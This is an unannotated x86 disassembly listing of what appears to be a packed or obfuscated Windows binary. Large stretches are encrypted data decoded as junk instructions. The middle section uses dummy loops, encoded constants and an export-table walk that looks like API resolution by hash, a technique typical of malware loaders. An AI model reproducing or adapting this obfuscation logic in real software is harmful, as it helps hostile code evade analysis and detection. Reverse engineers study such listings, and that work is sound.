  40a74a:	stos   DWORD PTR es:[edi],eax
  40a74b:	pusha  
  40a74c:	xor    al,0xa7
  40a74e:	shl    DWORD PTR [edi],cl
  40a750:	les    ecx,FWORD PTR [ebx+ecx*1+0x63]
  40a754:	dec    edx
  40a755:	aaa    
  40a756:	jae    0x40a770
  40a758:	mov    DWORD PTR [edi+0x23],ecx
  40a75b:	mov    ?,WORD PTR [esi-0x74]
  40a75e:	scas   eax,DWORD PTR es:[edi]
  40a75f:	jge    0x40a75e
  40a761:	mov    eax,0xd4407828
  40a766:	xchg   esi,eax
  40a767:	(bad)  
  40a768:	stos   BYTE PTR es:[edi],al
  40a769:	pushf  
  40a76a:	std    
  40a76b:	in     al,dx
  40a76c:	(bad)  
  40a76d:	push   edx
  40a76e:	out    dx,eax
  40a76f:	or     eax,0x5b794c0a
  40a774:	bound  esp,QWORD PTR [eiz*2+0x7dfb6984]
  40a77b:	inc    eax
  40a77c:	out    dx,eax
  40a77d:	pop    edi
  40a77e:	mov    ebx,0x80371210
  40a783:	mov    eax,0xa6a09991
  40a788:	xchg   DWORD PTR [ebp+0x7a],eax
  40a78b:	repz mov eax,ds:0xdb23402b
  40a791:	jl     0x40a724
  40a793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a794:	inc    edx
  40a795:	retf   0x15b6
  40a798:	add    esp,eax
  40a79a:	and    bh,BYTE PTR [eax-0x1e02568d]
  40a7a0:	dec    esp
  40a7a1:	add    DWORD PTR [edx-0x28],0x2c
  40a7a5:	call   0xd6072bc3
  40a7aa:	mov    eax,ds:0xd42c85da
  40a7af:	lea    ebp,[eax]
  40a7b1:	mov    esp,0x8a8962cf
  40a7b6:	dec    esp
  40a7b7:	sub    dh,cl
  40a7b9:	(bad)  
  40a7bb:	mov    dl,0x18
  40a7bd:	fucomip st,st(1)
  40a7bf:	call   FWORD PTR [ebp-0x725fd291]
  40a7c5:	cmp    BYTE PTR [ebx-0x702abcd1],cl
  40a7cb:	cmp    al,0x4a
  40a7cd:	jne    0x40a756
  40a7cf:	out    dx,al
  40a7d0:	or     ah,ch
  40a7d2:	pop    ecx
  40a7d3:	popa   
  40a7d4:	mov    DWORD PTR [esi+0x7f6036a8],esi
  40a7da:	cs jns 0x40a786
  40a7dd:	add    edx,DWORD PTR [eax]
  40a7df:	(bad)  
  40a7e0:	jno    0x40a837
  40a7e2:	pop    edx
  40a7e3:	cmp    eax,DWORD PTR [edi]
  40a7e5:	cmc    
  40a7e6:	sbb    eax,0x6e3f225a
  40a7eb:	adc    DWORD PTR [ebx],ebp
  40a7ed:	push   0xffffffd9
  40a7ef:	xor    eax,0x44a93ab6
  40a7f4:	arpl   bx,bx
  40a7f6:	push   ebp
  40a7f7:	jns    0x40a813
  40a7f9:	call   0x5c10f41b
  40a7fe:	push   edx
  40a7ff:	mov    ecx,0x732ef18d
  40a804:	mov    ebx,0x827860e9
  40a809:	push   0xb4cf3263
  40a80e:	scas   al,BYTE PTR es:[edi]
  40a80f:	mov    ebp,DWORD PTR [edi-0x5fe22c96]
  40a815:	dec    DWORD PTR [ebx]
  40a817:	(bad)  
  40a818:	fsincos 
  40a81a:	aas    
  40a81b:	or     eax,ebp
  40a81d:	call   0x4732fc51
  40a822:	dec    ebx
  40a823:	fcmovnb st,st(3)
  40a825:	xor    DWORD PTR [ebp-0x80],esp
  40a828:	xor    eax,0x15eed82f
  40a82d:	imul   esp,DWORD PTR ds:0xa9828bd7,0x42fb4589
  40a837:	mov    ebp,0x8b271d06
  40a83c:	or     BYTE PTR [edi-0x71],dh
  40a83f:	in     al,0x6
  40a841:	outs   dx,BYTE PTR ds:[esi]
  40a842:	dec    ecx
  40a843:	xchg   ebx,eax
  40a844:	push   ecx
  40a845:	lahf   
  40a846:	sbb    DWORD PTR [esi],0xfb753c6b
  40a84c:	jl     0x40a7ce
  40a84e:	inc    edx
  40a84f:	sti    
  40a850:	xchg   ebx,eax
  40a851:	push   edi
  40a852:	js     0x40a7d7
  40a854:	leave  
  40a855:	cs sub eax,0xcc335380
  40a85b:	jmp    0x40a8c6
  40a85d:	mov    ecx,0x8a49d2ab
  40a862:	inc    edi
  40a863:	jae    0x40a85d
  40a865:	in     eax,dx
  40a866:	jbe    0x40a87b
  40a868:	and    ecx,ecx
  40a86a:	int3   
  40a86b:	cmp    eax,DWORD PTR [esi+0x25]
  40a86e:	popf   
  40a86f:	jp     0x40a88e
  40a871:	arpl   si,cx
  40a873:	and    DWORD PTR [edx-0x68],ebx
  40a876:	int    0x2f
  40a878:	push   cs
  40a879:	mov    ebp,0xd917aa65
  40a87e:	fidivr DWORD PTR [ecx-0xa2f1796]
  40a884:	call   0xffa1:0x4d0d9c7a
  40a88b:	rol    DWORD PTR [edx+ebx*4-0x3f],0x21
  40a890:	in     eax,0x2
  40a892:	fcmovnbe st,st(1)
  40a894:	add    al,0xd0
  40a896:	mov    bl,0x13
  40a898:	dec    esi
  40a899:	mov    dh,0x8b
  40a89b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a89c:	xor    cl,BYTE PTR [esi]
  40a89e:	fwait
  40a89f:	xchg   esp,eax
  40a8a0:	leave  
  40a8a1:	inc    edi
  40a8a2:	mov    esp,0x6e4fa648
  40a8a7:	daa    
  40a8a8:	or     eax,0xd2f29976
  40a8ad:	inc    edx
  40a8ae:	jp     0x40a8a2
  40a8b0:	xor    BYTE PTR [ecx+edi*2+0x49a3c4c6],al
  40a8b7:	mov    edi,0x66c9f3a8
  40a8bc:	lods   eax,DWORD PTR ds:[esi]
  40a8bd:	mov    ebx,0x4ba8f363
  40a8c2:	push   ebp
  40a8c3:	sbb    ebp,0x13
  40a8c6:	cmp    eax,0xf7e66ba9
  40a8cb:	lea    esi,ds:0xd05a19ea
  40a8d1:	shr    ch,1
  40a8d3:	xor    al,0x45
  40a8d5:	sub    bh,ch
  40a8d7:	inc    edx
  40a8d8:	inc    edi
  40a8d9:	pop    ebx
  40a8da:	sar    DWORD PTR [ecx],1
  40a8dc:	jnp    0x40a8ff
  40a8de:	jmp    0x40a8eb
  40a8e0:	inc    edx
  40a8e1:	test   al,0xe
  40a8e3:	xchg   esi,eax
  40a8e4:	push   ecx
  40a8e5:	fwait
  40a8e6:	shl    DWORD PTR [ebx+0x4f],0x2
  40a8ea:	sub    esi,DWORD PTR [eax-0x2cf19c6e]
  40a8f0:	std    
  40a8f1:	or     eax,0xe5cfa99f
  40a8f6:	dec    edi
  40a8f7:	push   cs
  40a8f8:	xor    eax,0x3a52b530
  40a8fd:	xchg   esp,eax
  40a8fe:	xor    eax,esi
  40a900:	push   edi
  40a901:	pop    ebx
  40a902:	pop    edi
  40a903:	clc    
  40a904:	jo     0x40a939
  40a906:	cmp    al,BYTE PTR [esi-0x35]
  40a909:	push   esi
  40a90a:	loope  0x40a949
  40a90c:	inc    esp
  40a90d:	cli    
  40a90e:	or     ecx,eax
  40a910:	mov    ebp,0x6dbd7424
  40a915:	nop
  40a916:	dec    esi
  40a917:	enter  0xda24,0x22
  40a91b:	mov    edx,0xe57a7054
  40a920:	rol    BYTE PTR [ebx+0x34f2bc8b],0xb0
  40a927:	cmp    eax,0x146ffaed
  40a92c:	sbb    BYTE PTR [ecx+0xcab26b1],al
  40a932:	inc    edx
  40a933:	add    ch,BYTE PTR [edi]
  40a935:	push   0x487b38e3
  40a93a:	int    0xc4
  40a93c:	addr16 adc al,0xee
  40a93f:	mov    al,ds:0x4d9f0037
  40a944:	xor    DWORD PTR [ebx+ebx*2-0x5e],ebp
  40a948:	cmp    BYTE PTR [edi-0x3e],ch
  40a94b:	scas   eax,DWORD PTR es:[edi]
  40a94c:	xchg   DWORD PTR [esi],ebp
  40a94e:	xchg   esi,eax
  40a94f:	xchg   ebp,eax
  40a950:	dec    ebp
  40a951:	push   ss
  40a952:	inc    edx
  40a953:	mov    cl,0xc3
  40a955:	and    ecx,edi
  40a957:	sbb    DWORD PTR [ebp-0x55],esp
  40a95a:	call   0x2b5d:0xe5d6e1f1
  40a961:	xor    al,0x9b
  40a963:	and    BYTE PTR [edi-0x5f75dbe8],al
  40a969:	rcl    BYTE PTR [esi+eax*4+0xef75c42],1
  40a970:	out    0xa1,eax
  40a972:	fcom   DWORD PTR [ebx]
  40a974:	adc    ah,bh
  40a976:	adc    DWORD PTR [esi],ebp
  40a978:	xlat   BYTE PTR ds:[ebx]
  40a979:	lock dec edx
  40a97b:	cwde   
  40a97c:	mov    ebp,0xe80c895a
  40a981:	pop    ebx
  40a982:	xchg   edx,eax
  40a983:	daa    
  40a984:	sub    ch,bl
  40a986:	in     al,0xd2
  40a988:	fild   DWORD PTR [ebx+ebx*4]
  40a98b:	enter  0x7460,0x62
  40a98f:	scas   al,BYTE PTR es:[edi]
  40a990:	retf   
  40a991:	mov    eax,0x8a66b960
  40a996:	retf   0x94bb
  40a999:	inc    esi
  40a99a:	push   0x8
  40a99c:	bound  edi,QWORD PTR [esi-0x9]
  40a99f:	mov    ds:0x705a866d,eax
  40a9a4:	(bad)  
  40a9a5:	loop   0x40a98a
  40a9a7:	push   DWORD PTR [edx-0x694721fc]
  40a9ad:	cmp    DWORD PTR [eax+ebp*1-0x6],0x77
  40a9b2:	in     eax,0xb0
  40a9b4:	push   ss
  40a9b5:	dec    ebp
  40a9b6:	bnd jns 0x40a99b
  40a9b9:	pop    esi
  40a9ba:	jecxz  0x40a9b1
  40a9bc:	sbb    bh,ah
  40a9be:	or     esi,esp
  40a9c0:	adc    al,0xc6
  40a9c2:	int3   
  40a9c3:	sbb    ah,BYTE PTR [eax-0x37759538]
  40a9c9:	mov    ds:0xe20eed10,al
  40a9ce:	(bad)  
  40a9cf:	into   
  40a9d0:	jl     0x40a99c
  40a9d2:	test   al,dh
  40a9d4:	push   ecx
  40a9d5:	imul   ecx,DWORD PTR [esi],0x8a25562a
  40a9db:	sahf   
  40a9dc:	and    esp,edi
  40a9de:	inc    esi
  40a9df:	je     0x40a9d1
  40a9e1:	inc    edi
  40a9e2:	jecxz  0x40aa07
  40a9e4:	adc    DWORD PTR [edx],edi
  40a9e6:	aaa    
  40a9e7:	mov    esp,0x7c1800d0
  40a9ec:	mov    al,0xa8
  40a9ee:	inc    edi
  40a9ef:	sub    DWORD PTR [edx+0x7a],edi
  40a9f2:	pop    ebx
  40a9f3:	pop    ds
  40a9f4:	adc    ch,BYTE PTR ds:0x39d09355
  40a9fa:	pop    es
  40a9fb:	pop    ecx
  40a9fc:	ins    BYTE PTR es:[edi],dx
  40a9fd:	inc    edx
  40a9fe:	sub    eax,0xf379d04b
  40aa03:	sub    DWORD PTR [ebx-0x13],esp
  40aa06:	sbb    BYTE PTR [edi-0x24],cl
  40aa09:	addr16 mov edi,0x4d135b5e
  40aa0f:	outs   dx,DWORD PTR ds:[esi]
  40aa10:	not    DWORD PTR es:[eax-0x60]
  40aa14:	ds js  0x40a9b6
  40aa17:	jb     0x40aa4d
  40aa19:	loope  0x40a9ca
  40aa1b:	jg     0x40a9a8
  40aa1d:	dec    edx
  40aa1e:	das    
  40aa1f:	cmp    eax,0xd53e166
  40aa24:	adc    bh,BYTE PTR [esi-0x3ff5bd0e]
  40aa2a:	int    0xcc
  40aa2c:	call   DWORD PTR ds:0x425014
  40aa32:	push   0x97898797
  40aa37:	or     DWORD PTR ds:0x42a008,0x42d008
  40aa41:	call   DWORD PTR ds:0x425004
  40aa47:	and    DWORD PTR ds:0x42c01c,0x0
  40aa51:	mov    ebx,DWORD PTR ds:0x42c01c
  40aa57:	inc    ebx
  40aa58:	mov    DWORD PTR ds:0x42c01c,ebx
  40aa5e:	cmp    DWORD PTR ds:0x42c01c,0x5
  40aa65:	jne    0x40aa76
  40aa6b:	push   0x57f5
  40aa70:	call   DWORD PTR ds:0x42504c
  40aa76:	cmp    DWORD PTR ds:0x42c01c,0x4
  40aa7d:	jne    0x40aa92
  40aa83:	xor    ebx,ebx
  40aa85:	xor    ebx,DWORD PTR ds:0x42c01c
  40aa8b:	inc    ebx
  40aa8c:	mov    DWORD PTR ds:0x42c01c,ebx
  40aa92:	cmp    DWORD PTR ds:0x42c01c,0x10
  40aa99:	jb     0x40aa51
  40aa9f:	xor    eax,eax
  40aaa1:	xor    eax,DWORD PTR ds:0x42a014
  40aaa7:	xor    DWORD PTR ds:0x42d018,eax
  40aaad:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  40aab4:	or     ecx,DWORD PTR ds:0x42d008
  40aaba:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40aac1:	mov    ecx,DWORD PTR [ebp-0x4]
  40aac4:	or     DWORD PTR ds:0x42b014,edi
  40aaca:	mov    ebx,0x7510893
  40aacf:	xor    eax,eax
  40aad1:	or     eax,DWORD PTR ds:0x423e56
  40aad7:	mov    eax,DWORD PTR [eax]
  40aad9:	or     DWORD PTR ds:0x42d018,eax
  40aadf:	xor    ecx,ebx
  40aae1:	not    eax
  40aae3:	mov    eax,0x3272db
  40aae8:	or     DWORD PTR ds:0x42c010,0x42900c
  40aaf2:	add    ecx,eax
  40aaf4:	mov    DWORD PTR [ebp-0x1c],ecx
  40aaf7:	mov    DWORD PTR ds:0x42c014,0x14
  40ab01:	cmp    DWORD PTR ds:0x42c014,0x0
  40ab08:	je     0x40aba7
  40ab0e:	cmp    DWORD PTR ds:0x42c014,0x2
  40ab15:	jne    0x40ab29
  40ab1b:	push   DWORD PTR [ebp-0x28]
  40ab1e:	push   0x424564
  40ab23:	call   DWORD PTR ds:0x425010
  40ab29:	cmp    DWORD PTR ds:0x42c014,0x3
  40ab30:	jne    0x40ab43
  40ab36:	mov    ecx,DWORD PTR ds:0x42c014
  40ab3c:	dec    ecx
  40ab3d:	mov    DWORD PTR ds:0x42c014,ecx
  40ab43:	mov    ecx,DWORD PTR ds:0x42c014
  40ab49:	dec    ecx
  40ab4a:	mov    DWORD PTR ds:0x42c014,ecx
  40ab50:	jmp    0x40ab01
  40ab55:	mov    DWORD PTR ds:0x42a018,0x12
  40ab5f:	cmp    DWORD PTR ds:0x42a018,0x0
  40ab66:	je     0x40aba7
  40ab6c:	cmp    DWORD PTR ds:0x42a018,0x1a
  40ab73:	jne    0x40ab85
  40ab79:	push   DWORD PTR [ebp-0x1c]
  40ab7c:	push   DWORD PTR [ebp-0x18]
  40ab7f:	call   DWORD PTR ds:0x425018
  40ab85:	mov    ecx,DWORD PTR ds:0x42a018
  40ab8b:	dec    ecx
  40ab8c:	mov    DWORD PTR ds:0x42a018,ecx
  40ab92:	jmp    0x40ab5f
  40ab97:	xor    ecx,ecx
  40ab99:	xor    ecx,DWORD PTR ds:0x4245cd
  40ab9f:	mov    ecx,DWORD PTR [ecx]
  40aba1:	sbb    DWORD PTR ds:0x42a00c,ecx
  40aba7:	mov    ecx,DWORD PTR [ebp+0x14]
  40abaa:	test   ecx,ecx
  40abac:	je     0x40ac29
  40abb2:	and    DWORD PTR ds:0x42c014,edi
  40abb8:	mov    ecx,DWORD PTR [ebp+0x14]
  40abbb:	mov    DWORD PTR ds:0x42c014,0x11
  40abc5:	cmp    DWORD PTR ds:0x42c014,0x0
  40abcc:	je     0x40ac1e
  40abd2:	cmp    DWORD PTR ds:0x42c014,0x5
  40abd9:	jne    0x40abf2
  40abdf:	push   0x429028
  40abe4:	push   DWORD PTR [ebp-0x20]
  40abe7:	push   0x4243d8
  40abec:	call   DWORD PTR ds:0x42501c
  40abf2:	cmp    DWORD PTR ds:0x42c014,0x6
  40abf9:	jne    0x40ac0c
  40abff:	mov    edi,DWORD PTR ds:0x42c014
  40ac05:	dec    edi
  40ac06:	mov    DWORD PTR ds:0x42c014,edi
  40ac0c:	mov    edi,DWORD PTR ds:0x42c014
  40ac12:	dec    edi
  40ac13:	mov    DWORD PTR ds:0x42c014,edi
  40ac19:	jmp    0x40abc5
  40ac1e:	mov    ecx,DWORD PTR [ecx]
  40ac20:	xor    DWORD PTR ds:0x42a018,ecx
  40ac26:	mov    DWORD PTR [ebp-0x1c],ecx
  40ac29:	adc    DWORD PTR ds:0x429024,edi
  40ac2f:	mov    ecx,0x7665
  40ac34:	imul   edx,eax
  40ac37:	mov    DWORD PTR ds:0x42d00c,0x1b
  40ac41:	cmp    DWORD PTR ds:0x42d00c,0x0
  40ac48:	je     0x40ac9b
  40ac4e:	cmp    DWORD PTR ds:0x42d00c,0x4
  40ac55:	jne    0x40ac69
  40ac5b:	push   0x429020
  40ac60:	push   DWORD PTR [ebp-0x1c]
  40ac63:	call   DWORD PTR ds:0x425020
  40ac69:	cmp    DWORD PTR ds:0x42d00c,0x5
  40ac70:	jne    0x40ac83
  40ac76:	mov    edi,DWORD PTR ds:0x42d00c
  40ac7c:	dec    edi
  40ac7d:	mov    DWORD PTR ds:0x42d00c,edi
  40ac83:	mov    edi,DWORD PTR ds:0x42d00c
  40ac89:	dec    edi
  40ac8a:	mov    DWORD PTR ds:0x42d00c,edi
  40ac90:	jmp    0x40ac41
  40ac95:	xor    DWORD PTR ds:0x42b010,edi
  40ac9b:	mov    esi,0x76532
  40aca0:	add    edx,ecx
  40aca2:	xchg   esi,ecx
  40aca4:	or     edi,esi
  40aca6:	mov    edi,0x54354
  40acab:	movzx  ecx,BYTE PTR ds:0x42901c
  40acb2:	sbb    DWORD PTR ds:0x429000,ecx
  40acb8:	sub    edx,edi
  40acba:	mov    ecx,DWORD PTR [ebp-0x4]
  40acbd:	sbb    DWORD PTR ds:0x429028,0x4a48
  40acc7:	xor    ecx,ebx
  40acc9:	and    esi,DWORD PTR ds:0x42900c
  40accf:	add    ecx,eax
  40acd1:	mov    DWORD PTR [ebp-0x8],ecx
  40acd4:	mov    DWORD PTR ds:0x42b014,0x169
  40acde:	mov    ecx,DWORD PTR [ebp-0x14]
  40ace1:	add    esi,DWORD PTR ds:0x42b000
  40ace7:	xor    ecx,ebx
  40ace9:	add    DWORD PTR ds:0x42d00c,0x42d004
  40acf3:	add    ecx,eax
  40acf5:	mov    DWORD PTR [ebp-0x24],ecx
  40acf8:	and    esi,esi
  40acfa:	mov    ecx,DWORD PTR [ebp-0x4]
  40acfd:	and    DWORD PTR ds:0x42b000,0x0
  40ad07:	jmp    0x40ad19
  40ad0c:	mov    esi,DWORD PTR ds:0x42b000
  40ad12:	inc    esi
  40ad13:	mov    DWORD PTR ds:0x42b000,esi
  40ad19:	cmp    DWORD PTR ds:0x42b000,0x10
  40ad20:	jae    0x40ad70
  40ad26:	cmp    DWORD PTR ds:0x42b000,0x4
  40ad2d:	jne    0x40ad3e
  40ad33:	push   0x8810
  40ad38:	call   DWORD PTR ds:0x425028
  40ad3e:	cmp    DWORD PTR ds:0x42b000,0x3
  40ad45:	jne    0x40ad58
  40ad4b:	mov    esi,DWORD PTR ds:0x42b000
  40ad51:	inc    esi
  40ad52:	mov    DWORD PTR ds:0x42b000,esi
  40ad58:	jmp    0x40ad0c
  40ad5d:	movzx  esi,WORD PTR ds:0x42d00c
  40ad64:	adc    esi,DWORD PTR ds:0x42b018
  40ad6a:	mov    DWORD PTR ds:0x42d00c,esi
  40ad70:	xor    ecx,ebx
  40ad72:	add    ecx,eax
  40ad74:	add    esi,0x75ba
  40ad7a:	mov    DWORD PTR [ebp-0x30],ecx
  40ad7d:	or     ecx,DWORD PTR ds:0x42c010
  40ad83:	mov    esi,DWORD PTR [ebp-0x4]
  40ad86:	inc    ecx
  40ad87:	xor    esi,ebx
  40ad89:	mov    ecx,DWORD PTR ds:0x4245b5
  40ad8f:	mov    ecx,DWORD PTR [ecx]
  40ad91:	adc    DWORD PTR ds:0x429020,ecx
  40ad97:	add    esi,eax
  40ad99:	mov    ecx,DWORD PTR [ebp-0x24]
  40ad9c:	sub    DWORD PTR ds:0x42c010,0x42c004
  40ada6:	sub    ecx,eax
  40ada8:	lea    edx,[esi-0x3272db]
  40adae:	xor    DWORD PTR ds:0x42a004,0x429028
  40adb8:	xor    ecx,ebx
  40adba:	xor    edx,ebx
  40adbc:	mov    DWORD PTR ds:0x42b00c,0x3cf6
  40adc6:	cmp    edx,ecx
  40adc8:	mov    DWORD PTR ds:0x42a008,0x130c
  40add2:	je     0x40afdf
  40add8:	sub    ecx,0x2467
  40adde:	mov    ecx,DWORD PTR [ebp-0x4]
  40ade1:	and    DWORD PTR ds:0x42c00c,0x42d01c
  40adeb:	xor    ecx,ebx
  40aded:	add    DWORD PTR ds:0x42b018,0x2ea9
  40adf7:	add    ecx,eax
  40adf9:	mov    DWORD PTR ds:0x42b000,0x737d
  40ae03:	cmp    esi,ecx
  40ae05:	mov    DWORD PTR ds:0x42b018,0x3d4e
  40ae0f:	jne    0x40afbc
  40ae15:	push   DWORD PTR [ebp+0x8]
  40ae18:	call   0x423bdc
  40ae1d:	mov    DWORD PTR [ebp-0x18],eax
  40ae20:	mov    eax,DWORD PTR [ebp-0x4]
  40ae23:	xor    edi,ecx
  40ae25:	mov    ecx,DWORD PTR [ebp-0x18]
  40ae28:	xor    eax,ebx
  40ae2a:	and    DWORD PTR ds:0x42901c,0x0
  40ae34:	jmp    0x40ae46
  40ae39:	mov    edi,DWORD PTR ds:0x42901c
  40ae3f:	inc    edi
  40ae40:	mov    DWORD PTR ds:0x42901c,edi
  40ae46:	cmp    DWORD PTR ds:0x42901c,0x1d
  40ae4d:	jae    0x40ae90
  40ae53:	cmp    DWORD PTR ds:0x42901c,0x2c
  40ae5a:	jne    0x40ae85
  40ae60:	push   0x61ef
  40ae65:	push   0x288b
  40ae6a:	push   0x42d018
  40ae6f:	push   DWORD PTR [ebp-0x28]
  40ae72:	push   0x2975
  40ae77:	push   DWORD PTR [ebp-0x24]
  40ae7a:	push   0x26ce
  40ae7f:	call   DWORD PTR ds:0x42502c
  40ae85:	jmp    0x40ae39
  40ae8a:	or     DWORD PTR ds:0x42c010,ebx
  40ae90:	mov    edi,0x3272db
  40ae95:	add    eax,edi
  40ae97:	mov    DWORD PTR ds:0x42901c,0x5f35
  40aea1:	cmp    ecx,eax
  40aea3:	mov    DWORD PTR ds:0x42c018,0x19df
  40aead:	je     0x40b04f
  40aeb3:	sub    DWORD PTR ds:0x42d018,0x5f9c
  40aebd:	push   DWORD PTR [ebp-0x18]
  40aec0:	and    DWORD PTR ds:0x42b018,0x42b000
  40aeca:	push   DWORD PTR [ebp+0x8]
  40aecd:	dec    DWORD PTR ds:0x42a00c
  40aed3:	call   0x423cbb
  40aed8:	or     DWORD PTR ds:0x42a014,0x42a00c
  40aee2:	mov    DWORD PTR [ebp-0x18],eax
  40aee5:	mov    eax,DWORD PTR [ebp-0x4]
  40aee8:	sbb    DWORD PTR ds:0x42a010,0x3b6d
  40aef2:	mov    ecx,DWORD PTR [ebp-0x18]
  40aef5:	xor    eax,ebx
  40aef7:	add    DWORD PTR ds:0x429004,0x42d004
  40af01:	add    eax,edi
  40af03:	mov    DWORD PTR ds:0x42a018,0x317f
  40af0d:	cmp    ecx,eax
  40af0f:	je     0x40b04f
  40af15:	mov    eax,DWORD PTR [ebp-0x18]
  40af18:	mov    eax,DWORD PTR [eax+0x18]
  40af1b:	mov    ecx,DWORD PTR ds:0x42d000
  40af21:	xor    DWORD PTR ds:0x42a014,ecx
  40af27:	mov    DWORD PTR [ebp-0x24],eax
  40af2a:	mov    eax,DWORD PTR [ebp-0x18]
  40af2d:	and    DWORD PTR ds:0x42b018,0x0
  40af37:	jmp    0x40af49
  40af3c:	mov    ecx,DWORD PTR ds:0x42b018
  40af42:	inc    ecx
  40af43:	mov    DWORD PTR ds:0x42b018,ecx
  40af49:	cmp    DWORD PTR ds:0x42b018,0x16
  40af50:	jae    0x40af77
  40af56:	cmp    DWORD PTR ds:0x42b018,0x20
  40af5d:	jne    0x40af6c
  40af63:	push   DWORD PTR [ebp-0x28]
  40af66:	call   DWORD PTR ds:0x425030
  40af6c:	jmp    0x40af3c
  40af71:	xor    ecx,DWORD PTR ds:0x42b01c
  40af77:	mov    ecx,DWORD PTR [ebp+0x8]
  40af7a:	add    ecx,DWORD PTR [eax+0x20]
  40af7d:	sub    eax,DWORD PTR ds:0x429024
  40af83:	mov    DWORD PTR [ebp-0x2c],ecx
  40af86:	mov    eax,DWORD PTR [ebp-0x18]
  40af89:	inc    ecx
  40af8a:	mov    ecx,DWORD PTR [ebp+0x8]
  40af8d:	add    ecx,DWORD PTR [eax+0x24]
  40af90:	mov    DWORD PTR [ebp-0x34],ecx
  40af93:	xor    DWORD PTR ds:0x42a004,edi
  40af99:	mov    eax,DWORD PTR [ebp-0x18]
  40af9c:	or     DWORD PTR ds:0x42a000,ebx
  40afa2:	mov    ecx,DWORD PTR [ebp+0x8]
  40afa5:	or     DWORD PTR ds:0x42a008,0x109d
  40afaf:	add    ecx,DWORD PTR [eax+0x1c]
  40afb2:	mov    eax,edi
  40afb4:	mov    DWORD PTR [ebp-0x18],ecx
  40afb7:	jmp    0x40b017
  40afbc:	mov    ecx,DWORD PTR [ebp-0x2c]
  40afbf:	mov    edx,DWORD PTR [ebp+0x8]
  40afc2:	add    edx,DWORD PTR [ecx+esi*4]
  40afc5:	mov    DWORD PTR [ebp-0x28],edx
  40afc8:	mov    ecx,DWORD PTR [ebp-0x4]
  40afcb:	mov    edx,DWORD PTR [ebp-0x28]
  40afce:	xor    ecx,ebx
  40afd0:	add    ecx,eax
  40afd2:	cmp    edx,ecx
  40afd4:	je     0x40b017
  40afda:	jmp    0x40b003
  40afdf:	mov    ecx,DWORD PTR [ebp-0x4]
  40afe2:	mov    edx,DWORD PTR [ebp-0x8]
  40afe5:	xor    ecx,ebx
  40afe7:	add    ecx,eax
  40afe9:	cmp    edx,ecx
  40afeb:	je     0x40b05b
  40aff1:	mov    ecx,DWORD PTR [ebp-0x4]
  40aff4:	mov    edx,DWORD PTR [ebp-0x30]
  40aff7:	xor    ecx,ebx
  40aff9:	add    ecx,eax
  40affb:	cmp    edx,ecx
  40affd:	je     0x40b06a
  40b003:	lea    eax,[ebp-0x8]
  40b006:	push   eax
  40b007:	push   DWORD PTR [ebp-0x28]
  40b00a:	push   DWORD PTR [ebp+0xc]
  40b00d:	call   0x401058
  40b012:	mov    eax,0x3272db
  40b017:	mov    ecx,DWORD PTR [ebp-0x4]
  40b01a:	mov    edx,DWORD PTR [ebp-0x8]
  40b01d:	xor    ecx,ebx
  40b01f:	add    ecx,eax
  40b021:	cmp    edx,ecx
  40b023:	je     0x40b03e
  40b029:	mov    ecx,DWORD PTR [ebp-0x34]
  40b02c:	movzx  ecx,WORD PTR [ecx+esi*2]
  40b030:	mov    edx,DWORD PTR [ebp-0x18]
  40b033:	mov    ecx,DWORD PTR [edx+ecx*4]
  40b036:	mov    DWORD PTR [ebp-0x38],ecx
  40b039:	jmp    0x40afdf
  40b03e:	mov    ecx,DWORD PTR [ebp-0x14]
  40b041:	xor    ecx,ebx
  40b043:	lea    esi,[esi+ecx*1+0x3272db]
  40b04a:	jmp    0x40ad99
  40b04f:	mov    eax,DWORD PTR [ebp-0x4]
  40b052:	xor    eax,ebx
  40b054:	add    eax,edi
  40b056:	jmp    0x40f898
  40b05b:	mov    eax,DWORD PTR [ebp-0x4]
  40b05e:	xor    eax,ebx
  40b060:	add    eax,0x3272db
  40b065:	jmp    0x40f898
  40b06a:	mov    ecx,DWORD PTR [ebp-0x38]
  40b06d:	add    ecx,DWORD PTR [ebp+0x8]
  40b070:	mov    DWORD PTR [ebp-0x10],ecx
  40b073:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b076:	test   ecx,ecx
  40b078:	je     0x40d4be
  40b07e:	mov    DWORD PTR [ebp-0x20],0x0
  40b085:	push   0x3
  40b087:	xor    edx,edx
  40b089:	pop    edx
  40b08a:	add    edx,0x8
  40b08d:	push   edx
  40b08e:	pop    ecx
  40b08f:	push   0x6
  40b091:	dec    ecx
  40b092:	pop    ebx
  40b093:	dec    ebx
  40b094:	xchg   ebx,ecx
  40b096:	sub    ebx,ecx
  40b098:	xchg   ebx,ecx
  40b09a:	dec    ecx
  40b09b:	mov    eax,DWORD PTR [ebp-0x1c]
  40b09e:	imul   eax,ecx
  40b0a1:	sub    esp,eax
  40b0a3:	mov    DWORD PTR [ebp-0x20],esp
  40b0a6:	mov    eax,DWORD PTR [ebp-0x4]
  40b0a9:	mov    ecx,0x7510893
  40b0ae:	xor    eax,ecx
  40b0b0:	mov    edx,0x3272db
  40b0b5:	add    eax,edx
  40b0b7:	mov    DWORD PTR [ebp+0x8],eax
  40b0ba:	mov    eax,DWORD PTR [ebp-0x14]
  40b0bd:	xor    eax,ecx
  40b0bf:	add    eax,edx
  40b0c1:	mov    edx,DWORD PTR [ebp+0x14]
  40b0c4:	jmp    0x40d429
  40b0c9:	fidiv  DWORD PTR [ecx+0x21]
  40b0cc:	jb     0x40b137
  40b0ce:	xor    ch,BYTE PTR [ecx-0x57]
  40b0d1:	ss pop es
  40b0d3:	add    eax,0x243ef9b
  40b0d8:	inc    edi
  40b0d9:	call   0x3aa313d3
  40b0de:	pop    edi
  40b0df:	bound  esp,QWORD PTR [edx-0x7c]
  40b0e2:	out    0x5a,al
  40b0e4:	mov    DWORD PTR [eax+0x54c6b6bf],esp
  40b0ea:	push   0x5d
  40b0ec:	adc    al,BYTE PTR [esi]
  40b0ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0ef:	push   eax
  40b0f0:	es dec edi
  40b0f2:	into   
  40b0f3:	push   ds
  40b0f4:	in     al,0x6
  40b0f6:	cmp    dh,BYTE PTR [esi-0x42728ca5]
  40b0fc:	addr16 sbb eax,esi
  40b0ff:	stos   DWORD PTR es:[edi],eax
  40b100:	jg     0x40b153
  40b102:	add    eax,0xe76dc483
  40b107:	xchg   ebp,eax
  40b108:	cmp    DWORD PTR [ebp-0x49],0xcd6ca1bf
  40b10f:	or     eax,0xccbab66d
